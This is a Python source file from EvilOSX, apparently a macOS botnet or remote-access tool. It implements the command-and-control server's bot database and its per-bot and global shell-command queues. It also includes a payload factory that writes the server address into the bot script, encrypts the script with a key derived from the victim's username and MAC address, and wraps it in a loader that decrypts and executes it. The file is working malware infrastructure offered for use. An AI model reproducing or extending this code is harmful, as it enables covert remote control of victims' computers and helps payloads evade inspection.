# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import sqlite3
from base64 import b64encode
from os import path
from threading import RLock
import json
from textwrap import dedent
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.Hash import MD5


class RequestType:
    """Enum class for bot request types."""

    def __init__(self):
        pass

    STAGE_1 = 0
    GET_COMMAND = 1
    RESPONSE = 2


class CommandType:
    """Enum class for command types."""

    def __init__(self):
        pass

    NONE = 0
    MODULE = 1
    SHELL = 2


class Command:
    """This class represents a command."""

    def __init__(self, command_type, command, options = None):
        """
        :param command_type: int
        :param command: bytes
        :param options: dict
        """
        self.type = command_type
        self.command = command
        self.options = options

    def __str__(self):
        """:return: The base64 string representation of this class which can be sent over the network."""
        if self.type == CommandType.NONE:
            return ""
        else:
            formatted = "{}\n{}\n".format(str(self.type), b64encode(self.command).decode())
            if self.options:
                formatted += b64encode(json.dumps(self.options).encode()).decode()

            return b64encode(formatted.encode()).decode()


class Bot:
    """This class represents a bot."""

    def __init__(self, bot_uid, username, hostname, last_online,
                 local_path, system_version, loader_name):
        """
        :type bot_uid: str
        :type username: str
        :type hostname: str
        :type last_online: float
        :type local_path: str
        :type system_version: str
        :type loader_name: str
        """
        self.uid = bot_uid
        self.username = username
        self.hostname = hostname
        self.last_online = last_online
        self.local_path = local_path
        self.system_version = system_version
        self.loader_name = loader_name


class Model:
    """Thread-safe model used by the controller."""

    def __init__(self):
        self._database_path = path.realpath(path.join(path.dirname(__file__), path.pardir, "data", "EvilOSX.db"))
        self._database = sqlite3.connect(self._database_path, check_same_thread=False)
        self._cursor = self._database.cursor()
        self._lock = RLock()  # It's important this is an RLock and not a Lock.

        # Create our tables.
        self._cursor.execute("DROP TABLE IF EXISTS bots")
        self._cursor.execute("DROP TABLE IF EXISTS commands")
        self._cursor.execute("DROP TABLE IF EXISTS global_command")
        self._cursor.execute("DROP TABLE IF EXISTS global_executed")
        self._cursor.execute("DROP TABLE IF EXISTS upload_files")

        self._cursor.execute("CREATE TABLE bots("
                             "bot_uid text PRIMARY KEY, "
                             "username text, "
                             "hostname text, "
                             "last_online real, "
                             "local_path text, "
                             "system_version text, "
                             "loader_name text)")
        self._cursor.execute("CREATE TABLE commands("
                             "bot_uid text, "
                             "command text)")
        self._cursor.execute("CREATE TABLE global_command("
                             "command text)")
        self._cursor.execute("CREATE TABLE global_executed("
                             "bot_uid text)")
        self._cursor.execute("CREATE TABLE upload_files("
                             "url_path text, "
                             "local_path text)")

        self._database.commit()

    def add_bot(self, bot):
        """Adds a bot to the database.

        :type bot: Bot
        """
        with self._lock:
            self._cursor.execute("INSERT INTO bots VALUES(?,?,?,?,?,?,?)", (
                bot.uid, bot.username, bot.hostname, bot.last_online,
                bot.local_path, bot.system_version, bot.loader_name
            ))
            self._database.commit()

    def update_bot(self, bot_uid, last_online, local_path):
        """Updates the bot's last online time and local path.

        :type bot_uid: str
        :type last_online: float
        :type local_path: str
        """
        with self._lock:
            self._cursor.execute("UPDATE bots SET last_online = ?, local_path = ? WHERE bot_uid = ?",
                                 (last_online, local_path, bot_uid))
            self._database.commit()

    def get_bot(self, bot_uid):
        """Retrieves a bot from the database.

        :type bot_uid: str
        :rtype: Bot
        """
        with self._lock:
            response = self._cursor.execute("SELECT * FROM bots WHERE bot_uid = ? LIMIT 1", (bot_uid,)).fetchone()
            return Bot(response[0], response[1], response[2], response[3], response[4], response[5], response[6])

    def remove_bot(self, bot_uid):
        """Removes the bot from the database.

        :type bot_uid: str
        """
        with self._lock:
            self._cursor.execute("DELETE FROM bots WHERE bot_uid = ?", (bot_uid,))
            self._database.commit()

    def is_known_bot(self, bot_uid):
        """:return: True if the bot is known to us.

        :type bot_uid: str
        :rtype: bool
        """
        with self._lock:
            response = self._cursor.execute("SELECT * FROM bots WHERE bot_uid = ?", (bot_uid,)).fetchone()

            if response:
                return True
            else:
                return False

    def get_bots(self, limit = -1, skip_amount = 0):
        """:return: A list of bot objects.

        :type limit: int
        :type skip_amount: int
        :rtype: list
        """
        with self._lock:
            bots = []
            response = self._cursor.execute("SELECT * FROM bots LIMIT ? OFFSET ?", (limit, skip_amount))

            for row in response:
                bots.append(Bot(row[0], row[1], row[2], row[3], row[4], row[5], row[6]))

            return bots

    def get_bot_amount(self):
        """:return: The amount of bots in the database.

        :rtype: int
        """
        with self._lock:
            response = self._cursor.execute("SELECT Count(*) FROM bots")
            return response.fetchone()[0]

    def set_global_command(self, command):
        """Sets the global command.

        :type command: Command
        """
        with self._lock:
            self._cursor.execute("DELETE FROM global_command")
            self._cursor.execute("DELETE FROM global_executed")
            self._cursor.execute("INSERT INTO global_command VALUES(?)", (str(command),))
            self._database.commit()

    def get_global_command(self):
        """:return: The globally set raw command.

        :rtype: str
        """
        with self._lock:
            response = self._cursor.execute("SELECT * FROM global_command").fetchone()

            if not response:
                return ""
            else:
                return response[0]

    def add_executed_global(self, bot_uid):
        """Adds the bot the list of who has executed the global module.

        :type bot_uid: str
        """
        with self._lock:
            self._cursor.execute("INSERT INTO global_executed VALUES (?)", (bot_uid,))
            self._database.commit()

    def has_executed_global(self, bot_uid):
        """:return: True if the bot has executed the global command or if no global command has been set.

        :type bot_uid: str
        :rtype: (bool, str or None)
        """
        with self._lock:
            global_command = self.get_global_command()

            if not global_command:
                return True, None
            else:
                response = self._cursor.execute("SELECT * FROM global_executed WHERE bot_uid = ? LIMIT 1",
                                                (bot_uid,)).fetchone()

                if response:
                    return True, None
                else:
                    return False, global_command

    def add_command(self, bot_uid, command):
        """Adds the command to the bot's command queue.

        :type bot_uid: str
        :type command: Command
        """
        with self._lock:
            self._cursor.execute("INSERT INTO commands VALUES(?,?)", (bot_uid, str(command)))
            self._database.commit()

    def get_command_raw(self, bot_uid):
        """Return and removes the first (raw base64) command in the bot's command queue, otherwise an empty string.

        :type bot_uid: str
        :rtype: str
        """
        with self._lock:
            response = self._cursor.execute("SELECT * FROM commands WHERE bot_uid = ?", (bot_uid,)).fetchone()

            if not response:
                return ""
            else:
                self._remove_command(bot_uid)
                return response[1]

    def _remove_command(self, bot_uid):
        """Removes the first command in the bot's queue.

        :type bot_uid: str
        """
        with self._lock:
            # Workaround for https://sqlite.org/compile.html#enable_update_delete_limit
            self._cursor.execute("DELETE FROM commands WHERE rowid = "
                                 "(SELECT rowid FROM commands WHERE bot_uid = ? LIMIT 1)", (bot_uid,))
            self._database.commit()

    def add_upload_file(self, url_path, local_path):
        """
        Adds a file which should be hosted by the server,
        should be automatically removed by the caller in x seconds.

        :type url_path: str
        :type local_path: str
        """
        with self._lock:
            self._cursor.execute("INSERT INTO upload_files VALUES (?,?)", (url_path, local_path))
            self._database.commit()

    def remove_upload_file(self, url_path):
        """Remove the file from the list of files the server should host.

        :type url_path: str
        """
        with self._lock:
            self._cursor.execute("DELETE FROM upload_files WHERE url_path = ?", (url_path,))
            self._database.commit()

    def get_upload_files(self):
        """:return: A tuple containing the URL path and local file path.

        :rtype: (str, str)
        """
        with self._lock:
            tuple_list = []
            response = self._cursor.execute("SELECT * FROM upload_files").fetchall()

            for row in response:
                tuple_list.append((row[0], row[1]))

            return tuple_list


class PayloadFactory:
    """Builds encrypted payloads which can only be run on the specified bot."""

    def __init__(self):
        pass

    @staticmethod
    def create_payload(bot_uid, payload_options, loader_options):
        """:return: The configured and encrypted payload.

        :type bot_uid: str
        :type payload_options: dict
        :type loader_options: dict
        :rtype: str
        """
        # Configure bot.py
        with open(path.realpath(path.join(path.dirname(__file__), path.pardir, "bot", "bot.py"))) as input_file:
            configured_payload = ""

            server_host = payload_options["host"]
            server_port = payload_options["port"]
            program_directory = loader_options["program_directory"]

            for line in input_file:
                if line.startswith("SERVER_HOST = "):
                    configured_payload += "SERVER_HOST = \"{}\"\n".format(server_host)
                elif line.startswith("SERVER_PORT = "):
                    configured_payload += "SERVER_PORT = {}\n".format(server_port)
                elif line.startswith("PROGRAM_DIRECTORY = "):
                    configured_payload += "PROGRAM_DIRECTORY = os.path.expanduser(\"{}\")\n".format(program_directory)
                elif line.startswith("LOADER_OPTIONS = "):
                    configured_payload += "LOADER_OPTIONS = {}\n".format(str(loader_options))
                else:
                    configured_payload += line

        # Encrypt the payload using the bot's unique key
        return dedent("""\
        #!/usr/bin/env python
        # -*- coding: utf-8 -*-
        import os
        import getpass
        import uuid
        
        def get_uid():
            return "".join(x.encode("hex") for x in (getpass.getuser() + "-" + str(uuid.getnode())))
        
        exec("".join(os.popen("echo '{}' | openssl aes-256-cbc -A -d -a -k %s -md md5" % get_uid()).readlines()))
        """.format(PayloadFactory._openssl_encrypt(bot_uid, configured_payload)))

    @staticmethod
    def wrap_loader(loader_name, loader_options, payload):
        """:return: The loader which will load the (configured and encrypted) payload.

        :type loader_name: str
        :type loader_options: dict
        :type payload: str
        :rtype: str
        """
        loader_path = path.realpath(path.join(
            path.dirname(__file__), path.pardir, "bot", "loaders", loader_name, "install.py")
        )
        loader = ""

        with open(loader_path, "r") as input_file:
            for line in input_file:
                if line.startswith("LOADER_OPTIONS = "):
                    loader += "LOADER_OPTIONS = {}\n".format(str(loader_options))
                elif line.startswith("PAYLOAD_BASE64 = "):
                    loader += "PAYLOAD_BASE64 = \"{}\"\n".format(b64encode(payload.encode()).decode())
                else:
                    loader += line

        return loader

    @staticmethod
    def _openssl_encrypt(password, plaintext):
        """
        :type password: str
        :type plaintext: str
        :rtype: str
        """
        # Thanks to Joe Linoff, taken from https://stackoverflow.com/a/42773185
        salt = get_random_bytes(8)
        key, iv = PayloadFactory._get_key_and_iv(password, salt)

        # PKCS#7 padding
        padding_len = 16 - (len(plaintext) % 16)
        padded_plaintext = plaintext + (chr(padding_len) * padding_len)

        # Encrypt
        cipher = AES.new(key, AES.MODE_CBC, iv)
        cipher_text = cipher.encrypt(padded_plaintext.encode())

        # Make OpenSSL compatible
        openssl_cipher_text = b"Salted__" + salt + cipher_text
        return b64encode(openssl_cipher_text).decode()

    @staticmethod
    def _get_key_and_iv(password, salt, key_length = 32, iv_length = 16):
        """
        :type password: str
        :type salt: bytes
        :type key_length: int
        :type iv_length: int
        :rtype: tuple
        """
        password = password.encode()

        try:
            max_length = key_length + iv_length
            key_iv = MD5.new(password + salt).digest()
            tmp = [key_iv]

            while len(tmp) < max_length:
                tmp.append(MD5.new(tmp[-1] + password + salt).digest())
                key_iv += tmp[-1]  # Append the last byte

            key = key_iv[:key_length]
            iv = key_iv[key_length:key_length + iv_length]
            return key, iv
        except UnicodeDecodeError:
            return None, None
